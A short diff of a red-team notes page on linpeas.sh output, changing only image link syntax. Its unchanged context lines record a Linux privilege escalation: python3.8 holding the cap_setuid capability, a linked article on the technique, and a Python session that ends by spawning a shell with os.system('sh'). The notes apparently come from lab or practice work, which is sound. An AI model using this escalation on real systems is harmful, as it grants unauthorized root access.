@@ -5,9 +5,9 @@ grand_parent: Red Team
 ---
 
 # linpeas.sh
-![](../../../../../../assets/images/Pasted%20image%2020260503234536.png)
+![[Pasted image 20260503234536.png]]
 
-![](../../../../../../assets/images/Pasted%20image%2020260503235120.png)
+![[Pasted image 20260503235120.png]]
 /usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
 
 https://medium.com/@forgecode/linux-privilege-escalation-via-cap-setuid-gaining-root-with-python-ecca7cab716e
@@ -23,4 +23,4 @@ root
 0
 >>> os.system('sh')
 ```
-![](../../../../../../assets/images/Pasted%20image%2020260503235833.png)
+![[Pasted image 20260503235833.png]]
